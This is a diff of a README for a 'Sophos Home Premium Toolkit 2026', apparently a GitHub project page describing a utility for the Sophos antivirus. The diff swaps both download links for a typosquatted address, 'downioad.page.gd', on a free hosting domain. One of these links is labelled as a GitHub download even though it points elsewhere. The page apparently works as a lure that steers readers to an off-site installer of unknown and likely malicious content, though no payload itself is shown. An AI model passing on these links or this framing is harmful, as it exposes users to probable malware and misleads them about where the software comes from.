@@ -2,7 +2,7 @@
 
 Sophos Home Premium Toolkit 2026 is a comprehensive desktop utility designed to enhance and manage your Sophos Home Premium installation on Windows. It provides advanced configuration options and streamlined management features for optimal security performance, ensuring your system stays protected and efficient.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 
@@ -70,4 +70,4 @@ This project is released under the MIT License, allowing for free use and modifi
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
